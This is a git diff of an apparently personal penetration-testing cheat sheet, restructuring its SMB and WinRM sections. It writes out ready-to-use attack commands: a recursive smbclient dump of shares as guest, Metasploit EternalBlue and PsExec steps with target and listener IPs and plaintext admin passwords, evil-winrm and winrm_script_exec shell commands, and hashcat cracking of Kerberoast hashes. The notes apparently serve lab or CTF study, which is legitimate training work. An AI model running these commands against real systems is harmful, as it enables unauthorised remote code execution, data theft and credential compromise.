@@ -734,15 +734,33 @@ https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
     - `use exploit/linux/samba/is_known_pipename `
 
 #### SMB
-###### EternalBlue
-- Exploiting `EternalBlue` vulnerabibility in SMBv1
-    - `use auxiliary/scanner/smb/smb_ms17_010`
+###### DumpShares
 
-- Exploiting Security misconsifugration *Message signing enabled but not required* by `PSExec`
-    - First finding credentials by brute forcing
-        - `scanner/smb/smb_login` / `hydra` / any other
-    - Exploiting flaw using metasploit `PsExec` module
-        - `use exploit/windows/smb/psexec` > `set RHOSTS 10.5.22.249` > `set LHOST 10.10.26.2` > `set SMBUSER administrator` > `set SMBPASS qwertyuiop` > `set LPORT 1234` > `exploit`
+- Dump All Share Accessible recusrively
+```
+┌──(kali㉿kali)-[~]
+└─$ `smbclient //10.10.90.60/Users -U guest `
+Password for [WORKGROUP\guest]:
+Try "help" to get a list of possible commands.
+            
+smb: \> recurse ON
+smb: \> mask ""
+smb: \> prompt OFF
+smb: \> mget *
+```
+###### RemoteCodeExecution
+-
+
+###### KnownExploits
+- EternalBlue
+    - Exploiting `EternalBlue` vulnerabibility in SMBv1
+        - `use auxiliary/scanner/smb/smb_ms17_010`
+
+    - Exploiting Security misconsifugration *Message signing enabled but not required* by `PSExec`
+        - First finding credentials by brute forcing
+            - `scanner/smb/smb_login` / `hydra` / any other
+        - Exploiting flaw using metasploit `PsExec` module
+            - `use exploit/windows/smb/psexec` > `set RHOSTS 10.5.22.249` > `set LHOST 10.10.26.2` > `set SMBUSER administrator` > `set SMBPASS qwertyuiop` > `set LPORT 1234` > `exploit`
 
 #### RDP
 
@@ -757,6 +775,9 @@ https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
 - Getting Command shell
     - `evil-winrm.rb -u administrator -p tinkerbell -i 10.5.27.211`
     - `use windows/winrm/winrm_script_exec` > `set RHOSTS 10.5.27.211` > `set RPORT 5985` > `set USERNAME administrator` > `set PASSWORD tinkerbell` > `set FORCE_VBS true` > `exploit`
+
+#### WinRM
+
 
 ### [Windows Post Exploitation Enumeration](#)
 
@@ -1095,6 +1116,7 @@ msf6 exploit(windows/local/persistence_service) > `run`
 
 ### [Linux Privilege Escalation](#)
 
+###
 **Privilege Escalation by Kernel Exploits**
 
 - Linux Exploit Suggestor
@@ -1620,6 +1642,7 @@ Conditions Required
 
 - Hashcat
     - `hashcat -m 0 -a 0 md5.txt rockyou.txt`
+    - `hashcat -m 13100  -a 0 kerberoshash ~/Downloads/rockyou.txt`
 
 ### [Windows Alternate Authentication (NTLM and Kerberos)](#)
 By alternate authentication material, we refer to any piece of data that can be used to access a Windows account without actually knowing a user's password itself. This is possible because of how some authentication protocols used by Windows networks work.
